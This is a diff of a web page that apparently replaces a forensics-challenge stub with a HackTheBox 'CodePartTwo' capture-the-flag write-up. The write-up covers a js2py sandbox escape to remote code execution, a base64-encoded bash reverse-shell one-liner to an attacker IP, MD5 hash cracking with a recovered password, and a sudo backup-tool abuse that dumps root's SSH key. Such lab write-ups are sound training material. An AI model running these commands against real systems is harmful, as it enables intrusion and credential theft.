@@ -4,18 +4,18 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="index, follow">
-    <title>SalineBreeze-2 - Hexicon Archives</title>
+    <title>CodePartTwo - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
-    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/sherlocks/SalineBreeze-2.html" />
-    <!-- Sherlock-specific metadata for SEO -->
-    <meta name="description" content="Writeup for SalineBreeze-2 sherlock - Easy difficulty level">
-    <meta name="keywords" content="Sherlock, SalineBreeze-2, Easy, Blue Team, writeup, cybersecurity, threat hunting, Hexicon">
+    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/CodePartTwo.html" />
+    <!-- Machine-specific metadata for SEO -->
+    <meta name="description" content="Detailed writeup for CodePartTwo machine from HackTheBox - Easy difficulty level">
+    <meta name="keywords" content="HackTheBox, CodePartTwo, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
     <header>
         <div class="container header-content">
-            <a href="../sherlocks.html" class="logo">Sherlock writeups</a>
+            <a href="../machines.html" class="logo">Machine writeups</a>
             <div class="header-controls">
                 <a href="../index.html" class="htb-icon" title="Link to the main page">
                     <img src="../favicon.png" alt="Archive" width="30" height="30">
@@ -31,28 +31,23 @@
     
     <div class="sidebar">
         <div class="difficulty-buttons">
-            <button class="difficulty-btn" data-difficulty="veasy">VEasy</button>
-            <div class="sherlock-list" id="veasy-sherlocks">
-                <!-- Will be populated dynamically -->
-            </div>
-
             <button class="difficulty-btn" data-difficulty="easy">Easy</button>
-            <div class="sherlock-list" id="easy-sherlocks">
+            <div class="machine-list" id="easy-machines">
                 <!-- Will be populated dynamically -->
             </div>
             
             <button class="difficulty-btn" data-difficulty="medium">Medium</button>
-            <div class="sherlock-list" id="medium-sherlocks">
+            <div class="machine-list" id="medium-machines">
                 <!-- Will be populated dynamically -->
             </div>
             
             <button class="difficulty-btn" data-difficulty="hard">Hard</button>
-            <div class="sherlock-list" id="hard-sherlocks">
+            <div class="machine-list" id="hard-machines">
                 <!-- Will be populated dynamically -->
             </div>
 
             <button class="difficulty-btn" data-difficulty="insane">Insane</button>
-            <div class="sherlock-list" id="insane-sherlocks">
+            <div class="machine-list" id="insane-machines">
                 <!-- Will be populated dynamically -->
             </div>
         </div>
@@ -61,17 +56,96 @@
     <div class="backdrop"></div>
     
     <main class="container writeup-content">
-        <h1 class="writeup-title">SalineBreeze-2</h1>
+        <h1 class="writeup-title">CodePartTwo</h1>
         <div class="writeup-metadata">
             <span class="difficulty easy">Easy</span>
-            <span class="date">January 29, 2026</span>
+            <span class="date">January 31, 2026</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
-                <!-- Sherlock-specific content goes here -->
-                <p><img alt="solved" src="../images/SalineBreeze-2/solved.png" /></p>
-<p>Due to sickness, I have failed to secure the challenge zip before its retirement. This means that I will not be able to create a writeup of this challenge, which is pretty easy to complete with the data gathered while solving SalineBreeze-1.</p>
+                <!-- Machine-specific content goes here -->
+                <p><img alt="pwned" src="../images/CodePartTwo/pwned.png" /></p>
+<p>CodePartTwo was an easy-difficulty Linux machine that began with an nmap scan revealing SSH on port 22 and a web application on port 8000.
+After creating a test account, I downloaded the application source code and identified a critical dependency in requirements.txt: js2py version 0.74, which is vulnerable to CVE-2024-28397 (sandbox escape leading to RCE).
+The web application featured a JavaScript code editor that passed user input directly to js2py.eval_js without sanitization. I leveraged the linked GitHub PoC to craft a sandbox escape payload using Python's JsDate constructor deserialization, modifying the exploit to execute system commands.
+After successfully achieving RCE with a whoami test, I escalated to a full reverse shell using a base64-encoded bash payload to avoid special character issues, gaining initial access as the app user.</p>
+<p>Once inside, I immediately exfiltrated the SQLite database (app.db) to analyze offline. Using sqlite3, I discovered MD5-hashed credentials for multiple users.
+I cracked the hashes using CrackStation and successfully recovered marco's password (sweetangelbabylove), allowing me to SSH into the machine and obtain the user flag.</p>
+<p>For privilege escalation, I ran sudo -l and discovered marco could execute /usr/local/bin/npbackup-cli as root without a password—a backup utility with a configuration file at npbackup.conf.
+Analyzing the config, I found it was set to back up only /home/app/app/ by default. I created a modified configuration file (npbackup1.conf) that changed the backup path to /root, then used npbackup-cli with the -b flag to create a backup snapshot of the root directory.
+After listing snapshots to identify the correct snapshot ID, I used the --dump flag to extract /root/.ssh/id_rsa from the backup repository. I copied the private SSH key to my machine, set appropriate permissions, and successfully authenticated as root via SSH to capture the root flag.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/CodePartTwo/nmap.png" /></p>
+<p>Initial nmap scan reveals only 2 open ports. SSH on 22, and a website on 8000.</p>
+<h2>Investigating the website</h2>
+<p><img alt="website" src="../images/CodePartTwo/website.png" /></p>
+<p>I can create an account and download the app's source code. I'll do both, beginning by creating an account of <code>test:test</code></p>
+<p><img alt="code" src="../images/CodePartTwo/code.png" /></p>
+<p>It looks like I can run JS code through this website. I'll take a look at the source code.</p>
+<p><img alt="tree" src="../images/CodePartTwo/tree.png" /></p>
+<p>I can see a requirements.txt file. This file is used to specify necessary libraries for Python scripts, and often contains version numbers of these packages.</p>
+<pre class="codehilite"><code># requirements.txt
+flask==3.0.3
+flask-sqlalchemy==3.1.1
+js2py==0.74
+</code></pre>
+
+<p><img alt="vuln" src="../images/CodePartTwo/vuln.png" /></p>
+<p>The code that I'll be running on the web editor is passed directly to <code>js2py.eval_js</code>. I'll check this version of js2py for vulnerabilities.</p>
+<p><a href="https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/tree/main">https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/tree/main</a></p>
+<p>Based on the exploit code, I came up with a way to achieve RCE directly via the web code editor.  The main idea here is to escape the sandbox and reach the Python classes for classic RCE.</p>
+<p><img alt="whoami" src="../images/CodePartTwo/whoami.png" /></p>
+<h2>Running commands on the host</h2>
+<p>I wanted to exfiltrate the DB without getting a reverse shell, but that proved to be quite a bit more complicated than I thought. I can send myself a reverse shell by replacing the whoami command with:</p>
+<p><code>printf YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuOTIvOTAwMSAwPiYxJwo=| base64 -d |bash</code></p>
+<p><img alt="shell" src="../images/CodePartTwo/shell.png" /></p>
+<p>I sent the database back to my host right away, so that I could look through it with sqlite3.</p>
+<p><img alt="database" src="../images/CodePartTwo/database.png" /></p>
+<p>From the source code, I know that the webapp uses MD5 for hashing its passwords. I will use CrackStation to try to crack these.</p>
+<p><img alt="crackstation" src="../images/CodePartTwo/crackstation.png" /></p>
+<p><code>marco | sweetangelbabylove</code></p>
+<p>I'll try to SSH into the box as marco.</p>
+<p><img alt="user" src="../images/CodePartTwo/user.png" /></p>
+<h1>Root flag</h1>
+<p><img alt="sudol" src="../images/CodePartTwo/sudol.png" /></p>
+<p>Marco can run <code>npbackup-cli</code> as root. This is a backup utility, and this immediately makes me think about backing up the <code>/root</code> directory for their SSH keys.</p>
+<p>Taking a look at the <code>npbackup.conf</code> file, I can see something that might allow me to accomplish this.</p>
+<pre class="codehilite"><code>conf_version: 3.0.1
+audience: public
+repos:
+  default:
+    repo_uri: 
+      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
+    repo_group: default_group
+    backup_opts:
+      paths:
+      - /home/app/app/ (!)
+      source_type: folder_list
+      exclude_files_larger_than: 0.0
+    repo_opts:
+      repo_password: 
+        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
+      retention_policy: {}
+      prune_max_unused: 0
+    prometheus: {}
+    env: {}
+    is_protected: false
+</code></pre>
+
+<p>With this config, only the <code>/home/app/app</code> directory will be backed up. If I change this path to <code>/root</code>, that should be backed up as well.</p>
+<p>Then I'll use the <code>-b</code> flag to back up the root dir, and the appropriate snapshot ID to list the backed-up contents.</p>
+<pre class="codehilite"><code>sudo /usr/local/bin/npbackup-cli -b -c npbackup1.conf
+
+sudo /usr/local/bin/npbackup-cli --snapshots -c npbackup1.conf
+
+sudo /usr/local/bin/npbackup-cli --snapshot-id acf6c37c -c npbackup1.conf --dump /root/.ssh/id_rsa
+</code></pre>
+
+<p><img alt="backed" src="../images/CodePartTwo/backed.png" /></p>
+<p>I'll copy the key to my box, and I will SSH into the box as root.</p>
+<p><img alt="root" src="../images/CodePartTwo/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
@@ -98,20 +172,20 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
     
     <script>
-        // Sherlock metadata for sidebar population
-        let sherlockData = {};
+        // Machine metadata for sidebar population
+        let machineData = {};
         
         // Function to initialize the application
         async function initializeApp() {
             try {
-                // Fetch sherlock metadata
-                const response = await fetch('../sherlocks.json');
+                // Fetch machine metadata
+                const response = await fetch('../machines.json');
                 if (!response.ok) {
-                    throw new Error('Failed to load sherlock metadata');
+                    throw new Error('Failed to load machine metadata');
                 }
-                sherlockData = await response.json();
+                machineData = await response.json();
                 
-                // Populate the sidebar with sherlock links
+                // Populate the sidebar with machine links
                 populateSidebar();
                 
                 // Generate table of contents
@@ -125,14 +199,13 @@
         // Call the initialization function when the page loads
         document.addEventListener('DOMContentLoaded', initializeApp);
 
-        // Populate sidebar with sherlock links dynamically
+        // Populate sidebar with machine links dynamically
         function populateSidebar() {
             const categories = {
-                "veasy": document.getElementById("veasy-sherlocks"),
-                "easy": document.getElementById("easy-sherlocks"),
-                "medium": document.getElementById("medium-sherlocks"),
-                "hard": document.getElementById("hard-sherlocks"),
-                "insane": document.getElementById("insane-sherlocks")
+                "easy": document.getElementById("easy-machines"),
+                "medium": document.getElementById("medium-machines"),
+                "hard": document.getElementById("hard-machines"),
+                "insane": document.getElementById("insane-machines")
             };
 
             // Clear existing links
@@ -140,16 +213,16 @@
                 category.innerHTML = '';
             }
 
-            // Add sherlock links to appropriate categories
-            for (const [sherlockName, data] of Object.entries(sherlockData)) {
+            // Add machine links to appropriate categories
+            for (const [machineName, data] of Object.entries(machineData)) {
                 const difficulty = data.difficulty.toLowerCase();
                 if (categories[difficulty]) {
                     const link = document.createElement('a');
-                    link.href = `../sherlocks/${sherlockName}.html`;
+                    link.href = `../machines/${machineName}.html`;
                     link.textContent = data.title;
                     
-                    // Highlight current sherlock
-                    if (data.title === "SalineBreeze-2") {
+                    // Highlight current machine
+                    if (data.title === "CodePartTwo") {
                         link.classList.add('active');
                     }
                     
@@ -266,9 +339,9 @@
             difficultyButtons.forEach(button => {
                 button.addEventListener('click', () => {
                     const difficulty = button.getAttribute('data-difficulty');
-                    const sherlockList = document.querySelector(`#${difficulty}-sherlocks`);
+                    const machineList = document.querySelector(`#${difficulty}-machines`);
                     
-                    sherlockList.classList.toggle('active');
+                    machineList.classList.toggle('active');
                 });
             });
             
